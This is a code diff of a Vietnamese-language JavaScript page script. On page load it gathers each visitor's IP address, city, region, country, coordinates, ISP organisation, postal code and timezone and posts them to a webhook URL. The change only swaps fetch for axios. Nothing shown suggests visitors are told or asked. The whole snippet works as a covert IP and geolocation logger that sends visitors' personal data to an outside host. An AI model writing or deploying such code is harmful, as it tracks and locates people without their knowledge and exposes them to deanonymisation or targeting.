@@ -18,31 +18,27 @@ document.addEventListener('DOMContentLoaded', function() {
             } = data;
             const requestData = {
                 content: `Thông tin của người truy cập:
-IP: ${ip}
-Thành phố: ${city}
-Khu vực: ${region}
-Quốc gia: ${country}
-Vị trí: ${loc}
-Tổ chức: ${org}
-Mã bưu điện: ${postal}
-Múi giờ: ${timezone}`
-            };            
+                IP: ${ip}
+                Thành phố: ${city}
+                Khu vực: ${region}
+                Quốc gia: ${country}
+                Vị trí: ${loc}
+                Tổ chức: ${org}
+                Mã bưu điện: ${postal}
+                Múi giờ: ${timezone}`
+            };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(requestData),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Gửi thông tin không thành công');
-                }
-            })
-            .catch(error => {
-                console.error('Lỗi kết nối:', error);
-            });
+            axios.post(webhookURL, requestData)
+                .then(response => {
+                    if (response.status === 200) {
+                        console.log('Thông tin đã được gửi thành công');
+                    } else {
+                        console.error('Gửi thông tin không thành công');
+                    }
+                })
+                .catch(error => {
+                    console.error('Lỗi kết nối:', error);
+                });
         })
         .catch(error => {
             console.error('Lấy địa chỉ IP không thành công:', error);
